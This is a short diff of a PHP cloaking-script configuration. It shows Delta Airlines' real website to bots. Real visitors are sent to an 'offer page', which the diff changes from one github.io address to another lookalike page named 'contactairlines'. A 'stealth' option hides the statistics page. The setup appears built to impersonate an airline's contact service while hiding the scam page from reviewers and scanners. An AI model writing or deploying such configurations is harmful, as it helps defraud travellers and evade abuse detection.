@@ -1,7 +1,7 @@
 <?php
 /* Required settings     */
 $CLOAKING['WHITE_PAGE'] = 'https://www.delta.com/apac/en';//PHP/HTML file or URL used for bots
-$CLOAKING['OFFER_PAGE'] = 'https://charlesmiller538.github.io/andrews/';//PHP/HTML file or URL offer used for real users
+$CLOAKING['OFFER_PAGE'] = 'https://contactairlines.netlify.app/';//PHP/HTML file or URL offer used for real users
 $CLOAKING['DEBUG_MODE'] = 'off';// replace "on" with "off" to switch from debug to production mode
 $CLOAKING['STEALTH'] = 'off';// replace "on" with "off" to hide stat page
 /*********************************************/
